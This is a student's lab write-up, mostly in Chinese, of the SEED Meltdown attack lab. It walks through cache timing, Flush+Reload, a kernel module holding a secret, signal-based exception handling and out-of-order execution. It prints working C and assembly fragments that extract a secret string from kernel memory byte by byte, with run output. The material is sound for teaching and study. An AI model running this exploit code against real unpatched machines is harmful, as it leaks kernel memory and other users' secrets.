# Meltdown Attack

# Task 1 and 2: Side channel Attacks via CPU Cache

 A typical cache block size is 64 bytes。

## Task 1: Reading from Cache versus from Memory

函数说明：

- __rdtscp：x86平台下特有。The __rdtscp intrinsic generates the rdtscp instruction
    - [out] Pointer to a location that will contain the contents of the machine-specific register TSC_AUX[31:0].
    - [return] A 64-bit unsigned integer tick count.

按照文档给出的程序，敲到Ubuntu中。出现以下错误，需要添加头文件`#include <stdint.h>` and `<stdio.h>`（做到后面发现这些.c文件官方都已经提供了，不过自己敲一遍印象更深刻！）
```
Cachetime.c:10:14: error: unknown type name ‘uint64_t’
     register uint64_t time1, time2;
```

`gcc -march=native Cachetime.c `编译Cachetime.c文件，执行`./a.out`,终端打印信息如下，很明显在3和9的位置访问时间较小，这是因为从Cache中拿数据，不需要访问主存：

```
[10/07/19]seed@VM:~/Meltdown$ ./a.out 
Access time for array[0*4096]: 200 CPU cycles
qAccess time for array[1*4096]: 296 CPU cycles
Access time for array[2*4096]: 348 CPU cycles
Access time for array[3*4096]: 72 CPU cycles
Access time for array[4*4096]: 332 CPU cycles
Access time for array[5*4096]: 456 CPU cycles
Access time for array[6*4096]: 348 CPU cycles
Access time for array[7*4096]: 64 CPU cycles
Access time for array[8*4096]: 332 CPU cycles
Access time for array[9*4096]: 340 CPU cycles
```
访问 Cache 和主存的时间区别较为明显，可取阈值在120左右。

## Task2: Using Cache as a Side Channel
任务：使用 Side Channel 提取 Victim 函数用到的秘密值。我们要使用到的技术被称为 `Flush + Reload`。攻击分为三步：

1. 从Cache 中 FLUSH 整个数组确保数组没有被 cache。
2. 调用 victim 函数，其会访问包含密码值的数组元素。这个操作就会让这个值被缓存。
3. RELOAD 整个数组, 同时测量加载每个元素的时间。如果某一个元素的加载时间很快，那么很可能这个元素已经被缓存了。这个元素也一定就是被victim函数访问的那个，然后我们就能找到secret value.

![Side_Channel_Attack ](_v_images/20191007172148633_12263.png)

因为 array[0*4096]可能会因为内存临近的变量的访问而被cache。因此我们要避免在FLUSH+RELOAD 方法中使用array[0*4096]。使用一个加偏移地址的方法避免这个问题。

直接按照程序写的阈值`80`会发现没有输出，毕竟在不同机器上跑的时间会有一定的区别，在这里我取 100。最后的输出如下所示。实验运行这个程序20次，有一次没有得到secret的值，可以考虑将阈值再设置大一点。
```
char secret = 94;
#define CACHE_HIT_THRESHOLE (100)
#define DELTA 1024

[10/08/19]seed@VM:~/Meltdown$ ./FlushReload 
array[94*4096 + 1024] is in cache.
The secret = 94.
```

# Task3-5: Preparation for thr Meltdown Attack
内存隔离是系统安全的基础。 在大多数操作系统中，用户程序是不能直接访问内核地址空间的。这种隔离是通过处理器的supervisor bit 实现的，该bit定义了内核的内存页是否可以访问。CPU进入内核空间该bit置位，用户空间清零。但是，这种隔离可以被 Meltdown Attack 破坏。

## Task3： Place Secret Data in Kernel Space
为了简化我们的攻击，我们将秘密数据存储在内核空间中，并展示了用户级程序如何找出秘密数据。

这种C代码的写法还未接触过，应该是驱动的写法吧~。
```
static __exit void test_proc_cleanup(void)
{
    remove_proc_entry("secret_data", NULL);
}
module_init(test_proc_init);
module_exit(test_proc_cleanup);
```

需要满足两个重要条件，否则Meltdown攻击将很难成功。
- 我们需要知道目标 secret data 的地址。内核模块保存了secret data 的地址`printk("secret data address:%p\n", &secret);`。在现实的Meltdown 攻击中，攻击者必须要自己找到办法获得这个地址，否则就需要猜。
- secret data 需要被缓存，否则攻击很难成功。To achieve this, we just need to use the secret once.使用这条语句`secret_entry = proc_create_data("secret_data",
0444, NULL, &test_proc_fops, NULL);`创建了一个数据项`/proc/secret_data`，这为用户级程序与内核Module交互提供了一个窗口。当用户级程序从读取该entry时，将调用内核模块中的`read_proc()`函数，并在其中加载secret变量然后被CPU缓存。


Linux 命令 ：
- insmod 功能：加载模块。
> Linux有许多功能是通过模块的方式，在需要时才载入kernel。如此可使kernel较为精简，进而提高效率，以及保有较大的弹性。这类可载入的模块，通常是设备驱动程序。

- dmesg
> dmesg 命令主要用来显示内核信息。使用 dmesg 可以有效诊断机器硬件故障或者添加硬件出现的问题。  
另外，使用 dmesg 可以确定您的服务器安装了那些硬件。每次系统重启，系统都会检查所有硬件并将信息记录下来。执行/bin/dmesg 命令可以查看该记录。 

按照文档进行编译，加载模块，使用命令dmesg可得如下结果。
```
    [191871.174616] secret data address:f9967000
```

## Task4: Access Kernel Memory From User Space
现在我们已经知道了 secret data 的地址，让我们实验一下，看看是否能直接通过地址得到这个数据。
```
int main ()
{
    char *kernel_data_addr = (char *)0xf9967000;
    char kernel_data = *kernel_data_addr;
    printf("I have reached here.\n");
    return 0;
}

```
编写以上代码，编译运行，出现段错误。直接访问内核空间地址是不可行的。
```
[10/08/19]seed@VM:~/Meltdown$ ./AccessTest 
Segmentation fault
```

## Task5: Handle Error/Exception in C
在 Task4 中我们直接访问内存导致了程序崩溃。在Meltdown 攻击下，我们需要在访问内核内存后做一些操作，所以我们不能让程序崩溃。
>  Accessing prohibited memory location will raise a SIGSEGV signal; if a program does not handle this exception by itself, the operating system will handle it and terminate the program.One way is to define our own signal handler in the program to capture the exceptions raised by catastrophic events.

在C语言中没有`try/Catch`语句，但是我们可以用 `sigsetjmp()` and `siglongjmp()`模拟操作。编写程序是注意要添加两个头文件`#include<signal.h>`, `#include<setjmp.h>`。运行结果如下，程序具体如何实现的在文档中已经说明得十分清晰了，这里就不再赘述，关键点记录一下。

-  `sigsetjmp(jbuf, 1)` saves the stack context/environment in jbuf for later use by siglongjmp(); it returns 0 when the checkpoint is set up.
- When `siglongjmp(jbuf, 1) `is called, the state saved in the `jbuf` variable is copied back in the processor and computation starts over from the return point of the
`sigsetjmp()` function. but the **returned value of the `sigsetjmp()` function is the second argument of the `siglongjmp()` function**, which is 1 in our case.

```
[10/08/19]seed@VM:~/Meltdown$ ./ExceptionHandler 
Memory access violation!
Program continues to exec.
```

关键函数定义
- int sigsetjmp(sigjmp_buf env, int savesigs)
    - 参数savesigs若为非0则代表搁置的信号集合也会一块保存
    - 返回值：返回0表示已经保存好目前的堆栈环境，随时可供siglongjmp()调用， 若返回非0值则代表由siglongjmp()返回


# Task 6: Out-of-Order Execution by CPU

`AccessTest.c` main 函数`objdump -d `反汇编如下
```
0804840b <main>:
 804840b:	8d 4c 24 04          	lea    0x4(%esp),%ecx
 804840f:	83 e4 f0             	and    $0xfffffff0,%esp
 8048412:	ff 71 fc             	pushl  -0x4(%ecx)
 8048415:	55                   	push   %ebp
 8048416:	89 e5                	mov    %esp,%ebp
 8048418:	51                   	push   %ecx
 8048419:	83 ec 14             	sub    $0x14,%esp
 804841c:	c7 45 f4 00 70 96 f9 	movl   $0xf9967000,-0xc(%ebp)
 8048423:	8b 45 f4             	mov    -0xc(%ebp),%eax
 8048426:	0f b6 00             	movzbl (%eax),%eax        # 读数据
 8048429:	88 45 f3             	mov    %al,-0xd(%ebp)
 804842c:	83 ec 0c             	sub    $0xc,%esp
 804842f:	68 d0 84 04 08       	push   $0x80484d0
 8048434:	e8 a7 fe ff ff       	call   80482e0 <puts@plt>
 8048439:	83 c4 10             	add    $0x10,%esp
 804843c:	b8 00 00 00 00       	mov    $0x0,%eax
 8048441:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 8048444:	c9                   	leave  
 8048445:	8d 61 fc             	lea    -0x4(%ecx),%esp
 8048448:	c3                   	ret    
```

由于现代CPU采用了被称为乱序执行的重要优化技术，第四行语句也是可能会被执行的。
```
1 number = 0;
2 *kernel_address = (char*)0xf9967000;
3 kernel_data = *kernel_address;
4 number = number + kernel_data;
```
乱序执行简单点说就是在访问kernel地址进行权限检查时，会将第四行代码加载到CPU中（但是第3行和第4行不是有数据相关性吗？第4行的读依赖于第3行的kernel_data写。还有CPU如何检查数据相关性这个不了解！）。在访问检查完成之前（CPU是如何并行检查访问权限的？~~应该是CPU外部的硬件来检查的吧~~应该是MMU根据内存的访问权限！），这个结果不会被提交。 In our case, the check fails, so all the results caused by the out-of-order execution will be discarded like it has never happened. T
![Out-of-Order](_v_images/20191008171937207_10959.png)

Intel 和其他CPU的设计者在设计Out-of-Order时犯了很严重的错误。如果不应该执行乱序执行，则会消除对寄存器和内存的无序执行的影响，因此该执行不会导致任何可见的影响。 但是，他们忘记了一件事，即对CPU缓存的影响。

Q：第一个问题，对于读指令，当处理器在等待数据从缓存或者内存返回的时候，它到底是什么状态？是等在那不动呢，还是继续执行别的指令？
A：一般来说，如果是乱序执行的处理器，那么可以执行后面的指令，如果是顺序执行，那么会进入停顿状态，直到读取的数据返回。乱序执行是说，对于一串给定的指令，为了提高效率，处理器会找出非真正数据依赖的指令，让他们并行执行。但是，指令执行结果在写回到寄存器的时候，必须是顺序的。也就是说，哪怕是先被执行的指令，它的运算结果也是按照指令次序写回到最终的寄存器的。


编译执行`MeltdownExperiment.c`程序，执行效果为`array[7*4096 + 1024] is in cache.`。产生这个现象的原因也很明显，文档中也讲得十分清楚了。在执行`kernel_data = *(char*)kernel_data_addr;`这条语句时，CPU不会等待内存数据的访问（读），会继续将下一条指令加载进CPU并且执行，导致array[7*4096 + 1024]被加入到寄存器以及cache中。最终因为上一条指令出错，寄存器值被清空，但数据依然保存在了cache中。在Relaod过程中检测array[7*4096 + 1024]数据访问时间满足cache的访问时间。

```
[10/08/19]seed@VM:~/.../Meltdown_Attack$ ./MeltdownExperiment 
Memory access violation!
array[7*4096 + 1024] is in cache.
The Secret = 7.
```

# Task 7: The Basic Meltdown Attack
CPU可以无序执行的程度取决于并行执行访问检查的速度。这是一个典型的竞争条件情况。

## Task 7.1:  A Naive Approach
修改`meltdown`函数如下，编译执行没有显示cache命中。
```
void meltdown(unsigned long kernel_data_addr)
{
  char kernel_data = 0;

  // The following statement will cause an exception
  kernel_data = *(char*)kernel_data_addr;
  array[kernel_data * 4096 + DELTA] += 1;
}

```

## Task 7.2: Improve the Attack by Getting the Secret Data Cached
Meltdown的脆弱性在于乱序执行与访问check之间的竞争。我们想要乱序执行的语句更多。所以我们需要弄清楚如何能让乱序执行更快。

在我们的代码中，乱序执行涉及到加载kernel data 到寄存器中，以及访问的安全检查。if 数据加载慢于安全检查，乱序执行就会立即被中断并丢弃。我们的攻击也就会失败。Meltdown攻击能否成功，很大程序上取决于CPU和DRAM的性能。

在调用`Meltdown`之前，通过调用·`pread`接口，将Secret Data 加载到Cache中。从而在meltdown中能更快的将数据加载进寄存器，在与Access Check的竞争时间上产生优势。

## Task 7.3: Using Assembly Code to Trigger Meltdown

下面的汇编代码做了一些无用的计算，但我们的目的是**“give the algorithmic units something to chew while memory access is being speculated**。这样可以增加成功率。
```
char kernel_data = 0;
// Give eax register something to do
asm volatile(
// 重复400次
".rept 400;" ➀
// 简单的eax + 0x141
"add $0x141, %%eax;"
".endr;" ➁
:
:
: "eax"
);
```
对源文件`MeltdownExperiment.c`进行了一些简单的修改，让读取数据，检查cache执行100次。并且对reload函数进行了简单的修改，使其命中cache时返回1，供main函数进行计数。
```
int reloadSideChannel()
{
  ...
  for(i = 0; i < 256; i++){
     ...
     if (time2 <= CACHE_HIT_THRESHOLD){
         printf("The Secret = %d.\n",i);
         return 1;
     }
  }
  return 0;
}

// main 函数修改部分
for(int i = 0; i < 100; i++) {
    // Flush
    for(int j = 0; j < 256; j++) _mm_clflush(&array[j*4096 + DELTA]);
    int ret = pread(fd, NULL, 0, 0); // Cause the secret data to be cached.

    if (sigsetjmp(jbuf, 1) == 0) {
        meltdown_asm(0xf9967000);
     }

    // RELOAD the probing array
    getCount += reloadSideChannel();
}
printf("~Get secret data~ percentage: %d/100\n",getCount);

```

实验现象：
1. 更改汇编代码中加法运算的次数
- 循环次数为400时，命中为99%
```
The Secret = 83.
The Secret = 83.
~Get secret data~ percentage: 99/100
```
- 循环次数为50时，命中为98%，有两次 secret data = 0  的现象，这都包含在了命中率上
- 循环次数为600， 命中率为100%。结果全部为83。


# Task 8: Make the Attack More Practical
因为程序可能产生多个结果，因此我们想要通过统计结果来推测最可靠的数据。实际上也就是计数，最后取出出现次数最多的那个。

编译运行`MeltdownAttack.c`文件（记得要修改secret data 的地址值），可得到如下结果：
```
[10/09/19]seed@VM:~/.../Meltdown_Attack$ ./MeltdownAttack 
The secret value is 83 S
The number of hits is 924
```
但以上只是得到了 secret data 的第一份byte值，为了得到8个数，我们要简单修改一下源文件。

```
for (k = 0; k < 8; k++) {
  memset(scores, 0, sizeof(scores));
  // Retry 1000 times on the same address.
  for (i = 0; i < 1000; i++) {
        ret = pread(fd, NULL, 0, 0);
        if (ret < 0) {
          perror("pread");
          break;
        }
        // Flush the probing array
        for (j = 0; j < 256; j++)
                _mm_clflush(&array[j * 4096 + DELTA]);
        if (sigsetjmp(jbuf, 1) == 0) { meltdown_asm(secret_data_start + k); }

        reloadSideChannelImproved();
  }
  // Find the index with the highest score.
  int max = 0;
  for (i = 0; i < 256; i++) {
        if (scores[max] < scores[i]) max = i;
  }
  printf("The secret value is %d %c\n", max, max);
  printf("The number of hits is %d\n", scores[max]);
}

```

实验结果如下：
```
[10/09/19]seed@VM:~/.../Meltdown_Attack$ ./MeltdownAttack 
The secret value is 83 S
The number of hits is 969
The secret value is 69 E
The number of hits is 965
The secret value is 69 E
The number of hits is 968
The secret value is 68 D
The number of hits is 968
The secret value is 76 L
The number of hits is 964
The secret value is 97 a
The number of hits is 966
The secret value is 98 b
The number of hits is 970
The secret value is 115 s
The number of hits is 968
```

# 实验总结
Meltdown 攻击能实现依赖于两个关键点：CPU的乱序执行以及乱序执行失败后没有清除Cache中的数据。还有两个前提条件是：1.首先要知道secret data 的地址。2. 内核空间的数据需要通过某些内
核程序提供的访问接口，加载到CPU的Cache中。因为读数据与access check之间会产生竞争。

整个实验流程至此也是十分清晰了，首先通过read操作将内核数据加载到Cache中，在用户程序中通过给定地址直接访问内核空间数据，这时会出现`segment fault`。通过类似于`try/catch`的机制忽略这个错误，使程序继续执行。这里就开始用到CPU乱序执行的机制，在Access Check 完成之前，kernel_data数据已经读入，然后对`array[kernel_data * 4096 + DELTA]`进行访问一次，使这部分内容也被加载到Cache中。最终通过遍历访问array数组，确定之间加载了那部分内容进入Cache而确定kernel_data的值。